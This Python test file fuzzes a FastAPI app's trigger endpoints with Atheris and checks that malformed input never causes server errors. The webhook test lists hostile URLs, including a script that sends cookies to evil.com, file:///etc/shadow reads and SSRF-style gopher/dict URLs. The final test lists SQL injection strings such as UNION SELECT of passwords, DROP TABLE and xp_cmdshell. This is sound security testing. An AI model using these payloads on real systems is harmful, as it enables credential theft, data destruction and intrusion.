"""
Trigger execution fuzzing harness for FastAPI endpoints.

This module uses Atheris to fuzz trigger validation, execution, and scheduling
endpoints to discover crashes, security vulnerabilities, and edge cases.

Coverage:
- POST /api/triggers/validate - Validate trigger configuration
- POST /api/triggers/execute - Execute trigger
- POST /api/triggers/schedule - Schedule trigger
- Webhook trigger handling: URL validation, headers, payloads
- Event trigger handling: event types, sources, data
"""

import os
import sys

# Add backend to path
backend_dir = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
if backend_dir not in sys.path:
    sys.path.insert(0, backend_dir)

import pytest
from fastapi.testclient import TestClient
from sqlalchemy.orm import Session

# Import fixtures
from tests.fuzzing.conftest import ATHERIS_AVAILABLE
from tests.e2e_ui.fixtures.database_fixtures import db_session
from tests.e2e_ui.fixtures.auth_fixtures import authenticated_user, test_user

from main_api_app import app
from core.database import get_db

# Try to import Atheris
try:
    import atheris
    from atheris import fp
    ATHERIS_AVAILABLE = True
except ImportError:
    ATHERIS_AVAILABLE = False


# ============================================================================
# TEST TRIGGER VALIDATE FUZZING
# ============================================================================

@pytest.mark.fuzzing
@pytest.mark.slow
@pytest.mark.timeout(300)
def test_trigger_validate_fuzz(db_session: Session, authenticated_user):
    """
    Fuzz trigger validation endpoint (POST /api/triggers/validate).

    PROPERTY: Trigger validation endpoint should not crash on malformed input
    STRATEGY: Use FuzzedDataProvider to generate random trigger configurations
    INVARIANT: Response status code always in [200, 400, 422] (no 500 errors)

    RADII: 10000 iterations provides coverage of:
    - Various trigger types (webhook, schedule, event, invalid)
    - Malformed trigger_config dict (0-10 keys, random values)
    - Invalid trigger_conditions (0-5 items, malformed conditions)
    - SQL injection in condition expressions

    Args:
        db_session: Database session with transaction rollback
        authenticated_user: (user, token) tuple for JWT auth
    """
    if not ATHERIS_AVAILABLE:
        pytest.skip("Atheris not installed")

    user, token = authenticated_user

    app.dependency_overrides[get_db] = lambda: db_session
    client = TestClient(app)
    headers = {"Authorization": f"Bearer {token}"}

    def fuzz_one_input(data: bytes):
        """Fuzz trigger validation endpoint with random input."""
        try:
            fdp = fp.FuzzedDataProvider(data)

            # Fuzz trigger_type (webhook, schedule, event, invalid values)
            type_idx = fdp.ConsumeIntInRange(0, 3)
            if type_idx == 0:
                trigger_type = "webhook"
            elif type_idx == 1:
                trigger_type = "schedule"
            elif type_idx == 2:
                trigger_type = "event"
            else:
                trigger_type = fdp.ConsumeRandomLengthString(50)  # Invalid type

            # Fuzz trigger_config dict (0-10 keys, random values)
            num_keys = fdp.ConsumeIntInRange(0, 10)
            trigger_config = {}
            for i in range(num_keys):
                key = fdp.ConsumeRandomLengthString(50)
                value_type = fdp.ConsumeIntInRange(0, 3)
                if value_type == 0:
                    value = fdp.ConsumeRandomLengthString(100)
                elif value_type == 1:
                    value = fdp.ConsumeIntInRange(-1000000, 1000000)
                elif value_type == 2:
                    value = fdp.ConsumeBool()
                else:
                    value = None
                trigger_config[key] = value

            # Fuzz trigger_conditions list (0-5 items, invalid conditions)
            num_conditions = fdp.ConsumeIntInRange(0, 5)
            trigger_conditions = []
            for i in range(num_conditions):
                condition = {
                    "field": fdp.ConsumeRandomLengthString(50),
                    "operator": fdp.ConsumeRandomLengthString(20),
                    "value": fdp.ConsumeRandomLengthString(100)
                }
                trigger_conditions.append(condition)

            payload = {
                "trigger_type": trigger_type,
                "trigger_config": trigger_config,
                "trigger_conditions": trigger_conditions
            }

            # Call POST /api/triggers/validate
            response = client.post("/api/triggers/validate", json=payload, headers=headers)

            # Assert status in [200, 400, 422]
            assert response.status_code in [200, 400, 422], \
                f"Unexpected status {response.status_code}: {response.text[:200]}"

        except Exception as e:
            if "validation" not in str(e).lower() and "422" not in str(e):
                raise

    atheris.Setup(sys.argv, [fuzz_one_input])
    atheris.Fuzz()


# ============================================================================
# TEST TRIGGER EXECUTE FUZZING
# ============================================================================

@pytest.mark.fuzzing
@pytest.mark.slow
@pytest.mark.timeout(300)
def test_trigger_execute_fuzz(db_session: Session, authenticated_user):
    """
    Fuzz trigger execution endpoint (POST /api/triggers/execute).

    PROPERTY: Trigger execution endpoint should not crash on malformed input
    STRATEGY: Use FuzzedDataProvider to generate random trigger IDs and contexts
    INVARIANT: Response status code always in [200, 400, 404, 422] (no 500 errors)

    RADII: 10000 iterations provides coverage of:
    - Invalid trigger_id formats (None, empty, huge strings)
    - Malformed execution_context dict (0-10 keys, nested values)
    - Invalid trigger_payload (0-1000 chars, None, empty, JSON)
    - SQL injection in context fields

    Args:
        db_session: Database session with transaction rollback
        authenticated_user: (user, token) tuple for JWT auth
    """
    if not ATHERIS_AVAILABLE:
        pytest.skip("Atheris not installed")

    user, token = authenticated_user

    app.dependency_overrides[get_db] = lambda: db_session
    client = TestClient(app)
    headers = {"Authorization": f"Bearer {token}"}

    def fuzz_one_input(data: bytes):
        """Fuzz trigger execution endpoint with random input."""
        try:
            fdp = fp.FuzzedDataProvider(data)

            # Fuzz trigger_id (50 chars, None, empty)
            trigger_id = fdp.ConsumeRandomLengthString(50)

            # Fuzz execution_context dict (0-10 keys, nested values)
            num_keys = fdp.ConsumeIntInRange(0, 10)
            execution_context = {}
            for i in range(num_keys):
                key = fdp.ConsumeRandomLengthString(50)
                value_type = fdp.ConsumeIntInRange(0, 3)
                if value_type == 0:
                    value = fdp.ConsumeRandomLengthString(500)
                elif value_type == 1:
                    # Nested dict
                    nested_keys = fdp.ConsumeIntInRange(0, 5)
                    value = {fdp.ConsumeRandomLengthString(20): fdp.ConsumeRandomLengthString(100) for _ in range(nested_keys)}
                elif value_type == 2:
                    value = fdp.ConsumeIntInRange(-1000000, 1000000)
                else:
                    value = None
                execution_context[key] = value

            # Fuzz trigger_payload (0-1000 chars, None, empty, JSON)
            trigger_payload = fdp.ConsumeRandomLengthString(1000)

            payload = {
                "trigger_id": trigger_id if trigger_id else None,
                "execution_context": execution_context,
                "trigger_payload": trigger_payload if trigger_payload else None
            }

            # Call POST /api/triggers/execute
            response = client.post("/api/triggers/execute", json=payload, headers=headers)

            # Assert status in [200, 400, 404, 422]
            assert response.status_code in [200, 400, 404, 422], \
                f"Unexpected status {response.status_code}: {response.text[:200]}"

        except Exception as e:
            if "validation" not in str(e).lower() and "422" not in str(e):
                raise

    atheris.Setup(sys.argv, [fuzz_one_input])
    atheris.Fuzz()


# ============================================================================
# TEST TRIGGER SCHEDULE FUZZING
# ============================================================================

@pytest.mark.fuzzing
@pytest.mark.slow
@pytest.mark.timeout(300)
def test_trigger_schedule_fuzz(db_session: Session, authenticated_user):
    """
    Fuzz trigger scheduling endpoint (POST /api/triggers/schedule).

    PROPERTY: Trigger scheduling endpoint should not crash on malformed input
    STRATEGY: Use FuzzedDataProvider to generate random schedule configurations
    INVARIANT: Response status code always in [200, 400, 404, 422] (no 500 errors)

    RADII: 10000 iterations provides coverage of:
    - Invalid trigger_id formats
    - Malformed schedule_config dict (cron, interval, invalid formats)
    - Past dates (should fail validation)
    - Future dates (should succeed)
    - Huge intervals (DoS protection)

    Args:
        db_session: Database session with transaction rollback
        authenticated_user: (user, token) tuple for JWT auth
    """
    if not ATHERIS_AVAILABLE:
        pytest.skip("Atheris not installed")

    user, token = authenticated_user

    app.dependency_overrides[get_db] = lambda: db_session
    client = TestClient(app)
    headers = {"Authorization": f"Bearer {token}"}

    def fuzz_one_input(data: bytes):
        """Fuzz trigger scheduling endpoint with random input."""
        try:
            fdp = fp.FuzzedDataProvider(data)

            # Fuzz trigger_id (50 chars, None, empty)
            trigger_id = fdp.ConsumeRandomLengthString(50)

            # Fuzz schedule_config dict (cron, interval, invalid formats)
            schedule_type = fdp.ConsumeRandomLengthString(20)
            schedule_config = {
                "type": schedule_type,
                "cron": fdp.ConsumeRandomLengthString(100),  # Invalid cron syntax
                "interval_seconds": fdp.ConsumeIntInRange(-1000000, 1000000),  # Invalid interval
                "start_date": fdp.ConsumeRandomLengthString(50),  # Invalid date format
                "end_date": fdp.ConsumeRandomLengthString(50),  # Invalid date format
                "enabled": fdp.ConsumeBool(),
                "timezone": fdp.ConsumeRandomLengthString(50)  # Invalid timezone
            }

            payload = {
                "trigger_id": trigger_id if trigger_id else None,
                "schedule_config": schedule_config
            }

            # Call POST /api/triggers/schedule
            response = client.post("/api/triggers/schedule", json=payload, headers=headers)

            # Assert status in [200, 400, 404, 422]
            assert response.status_code in [200, 400, 404, 422], \
                f"Unexpected status {response.status_code}: {response.text[:200]}"

        except Exception as e:
            if "validation" not in str(e).lower() and "422" not in str(e):
                raise

    atheris.Setup(sys.argv, [fuzz_one_input])
    atheris.Fuzz()


# ============================================================================
# TEST TRIGGER WEBHOOK FUZZING
# ============================================================================

@pytest.mark.fuzzing
@pytest.mark.slow
@pytest.mark.timeout(300)
def test_trigger_webhook_fuzz(db_session: Session, authenticated_user):
    """
    Fuzz webhook trigger handling with URL validation.

    PROPERTY: Webhook trigger endpoint should not crash on malformed URLs
    STRATEGY: Use FuzzedDataProvider to generate random webhook configurations
    INVARIANT: Response status code always in [200, 400, 422] (no 500 errors)

    RADII: 10000 iterations provides coverage of:
    - Invalid webhook URLs (javascript:, file://, data:)
    - Huge URLs (DoS protection)
    - SQL injection in webhook headers
    - Malformed webhook_payload (0-5000 chars)
    - Forbidden protocols (ftp://, gopher://)

    Args:
        db_session: Database session with transaction rollback
        authenticated_user: (user, token) tuple for JWT auth
    """
    if not ATHERIS_AVAILABLE:
        pytest.skip("Atheris not installed")

    user, token = authenticated_user

    app.dependency_overrides[get_db] = lambda: db_session
    client = TestClient(app)
    headers = {"Authorization": f"Bearer {token}"}

    # Malicious URL patterns
    malicious_urls = [
        "javascript:alert('XSS')",
        "javascript:void(document.location='http://evil.com/'+document.cookie)",
        "file:///etc/passwd",
        "file:///etc/shadow",
        "data:text/html,<script>alert('XSS')</script>",
        "vbscript:msgbox('XSS')",
        "ftp://evil.com/file",
        "gopher://evil.com:70/_",
        "dict://evil.com:11211/",
        "http://" + "a" * 2000 + ".com",  # Huge URL
        "https://" + "a" * 2000 + ".com",  # Huge URL
        "",
        None,
        "http://",
        "https://",
        "//evil.com",
        "\\\\evil.com\\share",  # UNC path
    ]

    def fuzz_one_input(data: bytes):
        """Fuzz webhook trigger handling with random input."""
        try:
            fdp = fp.FuzzedDataProvider(data)

            # Fuzz webhook URL (use malicious URLs or generate random)
            if fdp.ConsumeBool():
                url_idx = fdp.ConsumeIntInRange(0, len(malicious_urls) - 1)
                webhook_url = malicious_urls[url_idx]
            else:
                webhook_url = fdp.ConsumeRandomLengthString(2000)

            # Fuzz webhook headers dict (0-10 keys, SQL injection)
            num_headers = fdp.ConsumeIntInRange(0, 10)
            webhook_headers = {}
            for i in range(num_headers):
                key = fdp.ConsumeRandomLengthString(100)
                value = fdp.ConsumeRandomLengthString(500)
                webhook_headers[key] = value

            # Fuzz webhook_payload (0-5000 chars, None, empty)
            webhook_payload = fdp.ConsumeRandomLengthString(5000)

            payload = {
                "trigger_type": "webhook",
                "trigger_config": {
                    "url": webhook_url if webhook_url else None,
                    "method": fdp.ConsumeRandomLengthString(10),  # GET, POST, PUT, DELETE, invalid
                    "headers": webhook_headers,
                    "body": webhook_payload if webhook_payload else None
                }
            }

            # Call POST /api/triggers/validate
            response = client.post("/api/triggers/validate", json=payload, headers=headers)

            # Assert no crashes (validation errors OK)
            assert response.status_code in [200, 400, 422], \
                f"Unexpected status {response.status_code}: {response.text[:200]}"

        except Exception as e:
            if "validation" not in str(e).lower() and "422" not in str(e):
                raise

    atheris.Setup(sys.argv, [fuzz_one_input])
    atheris.Fuzz()


# ============================================================================
# TEST TRIGGER EVENT FUZZING
# ============================================================================

@pytest.mark.fuzzing
@pytest.mark.slow
@pytest.mark.timeout(300)
def test_trigger_event_fuzz(db_session: Session, authenticated_user):
    """
    Fuzz event trigger handling.

    PROPERTY: Event trigger endpoint should not crash on malformed event data
    STRATEGY: Use FuzzedDataProvider to generate random event configurations
    INVARIANT: Response status code always in [200, 400, 422] (no 500 errors)

    RADII: 10000 iterations provides coverage of:
    - Invalid event_type (0-100 chars, None, empty)
    - Invalid event_source (0-100 chars, None, empty)
    - Malformed event_data dict (0-20 keys, nested structures)
    - SQL injection in event fields
    - Huge event payloads (DoS protection)

    Args:
        db_session: Database session with transaction rollback
        authenticated_user: (user, token) tuple for JWT auth
    """
    if not ATHERIS_AVAILABLE:
        pytest.skip("Atheris not installed")

    user, token = authenticated_user

    app.dependency_overrides[get_db] = lambda: db_session
    client = TestClient(app)
    headers = {"Authorization": f"Bearer {token}"}

    def fuzz_one_input(data: bytes):
        """Fuzz event trigger handling with random input."""
        try:
            fdp = fp.FuzzedDataProvider(data)

            # Fuzz event_type (0-100 chars, None, empty)
            event_type = fdp.ConsumeRandomLengthString(100)

            # Fuzz event_source (0-100 chars, None, empty)
            event_source = fdp.ConsumeRandomLengthString(100)

            # Fuzz event_data dict (0-20 keys, nested structures)
            num_keys = fdp.ConsumeIntInRange(0, 20)
            event_data = {}
            for i in range(num_keys):
                key = fdp.ConsumeRandomLengthString(50)
                value_type = fdp.ConsumeIntInRange(0, 4)
                if value_type == 0:
                    value = fdp.ConsumeRandomLengthString(1000)
                elif value_type == 1:
                    # Nested dict
                    nested_keys = fdp.ConsumeIntInRange(0, 10)
                    value = {fdp.ConsumeRandomLengthString(30): fdp.ConsumeRandomLengthString(200) for _ in range(nested_keys)}
                elif value_type == 2:
                    # Nested list
                    list_items = fdp.ConsumeIntInRange(0, 10)
                    value = [fdp.ConsumeRandomLengthString(100) for _ in range(list_items)]
                elif value_type == 3:
                    value = fdp.ConsumeIntInRange(-1000000, 1000000)
                else:
                    value = None
                event_data[key] = value

            payload = {
                "trigger_type": "event",
                "trigger_config": {
                    "event_type": event_type if event_type else None,
                    "event_source": event_source if event_source else None,
                    "event_data": event_data
                }
            }

            # Call POST /api/triggers/validate
            response = client.post("/api/triggers/validate", json=payload, headers=headers)

            # Assert no crashes (validation errors OK)
            assert response.status_code in [200, 400, 422], \
                f"Unexpected status {response.status_code}: {response.text[:200]}"

        except Exception as e:
            if "validation" not in str(e).lower() and "422" not in str(e):
                raise

    atheris.Setup(sys.argv, [fuzz_one_input])
    atheris.Fuzz()


# ============================================================================
# TEST TRIGGER CONDITION SQL INJECTION FUZZING
# ============================================================================

@pytest.mark.fuzzing
@pytest.mark.slow
@pytest.mark.timeout(300)
def test_trigger_condition_sql_injection_fuzz(db_session: Session, authenticated_user):
    """
    Fuzz trigger condition evaluation with SQL injection payloads.

    PROPERTY: Trigger condition evaluation should not crash on SQL injection
    STRATEGY: Test SQL injection patterns in condition expressions
    INVARIANT: Response status code always in [200, 400, 422] (no 500 errors)

    RADII: 10000 iterations provides coverage of:
    - SQL injection in condition field names
    - SQL injection in condition operators
    - SQL injection in condition values
    - Boolean-based SQL injection
    - Union-based SQL injection

    Args:
        db_session: Database session with transaction rollback
        authenticated_user: (user, token) tuple for JWT auth
    """
    if not ATHERIS_AVAILABLE:
        pytest.skip("Atheris not installed")

    user, token = authenticated_user

    app.dependency_overrides[get_db] = lambda: db_session
    client = TestClient(app)
    headers = {"Authorization": f"Bearer {token}"}

    # SQL injection payloads
    sql_payloads = [
        "' OR '1'='1",
        "' OR '1'='1'--",
        "' OR '1'='1'/*",
        "admin'--",
        "admin'/*",
        "' UNION SELECT NULL--",
        "' UNION SELECT username, password FROM users--",
        "'; DROP TABLE triggers;--",
        "1' AND '1'='1",
        "1' AND '1'='2",
        "'; EXEC xp_cmdshell('dir');--",
        "' OR 1=1--",
        "' OR 'a'='a",
        "NULL UNION SELECT NULL--",
    ]

    def fuzz_one_input(data: bytes):
        """Fuzz trigger conditions with SQL injection."""
        try:
            fdp = fp.FuzzedDataProvider(data)

            # Fuzz number of conditions
            num_conditions = fdp.ConsumeIntInRange(0, 5)
            trigger_conditions = []

            for i in range(num_conditions):
                # Use SQL injection payload or random string
                if fdp.ConsumeBool():
                    payload_idx = fdp.ConsumeIntInRange(0, len(sql_payloads) - 1)
                    field = sql_payloads[payload_idx]
                    operator = sql_payloads[payload_idx]
                    value = sql_payloads[payload_idx]
                else:
                    field = fdp.ConsumeRandomLengthString(50)
                    operator = fdp.ConsumeRandomLengthString(20)
                    value = fdp.ConsumeRandomLengthString(100)

                condition = {
                    "field": field,
                    "operator": operator,
                    "value": value
                }
                trigger_conditions.append(condition)

            payload = {
                "trigger_type": "condition",
                "trigger_config": {},
                "trigger_conditions": trigger_conditions
            }

            # Call POST /api/triggers/validate
            response = client.post("/api/triggers/validate", json=payload, headers=headers)

            # Assert no crashes (validation errors OK)
            assert response.status_code in [200, 400, 422], \
                f"Unexpected status {response.status_code}: {response.text[:200]}"

        except Exception as e:
            if "validation" not in str(e).lower() and "422" not in str(e):
                raise

    atheris.Setup(sys.argv, [fuzz_one_input])
    atheris.Fuzz()
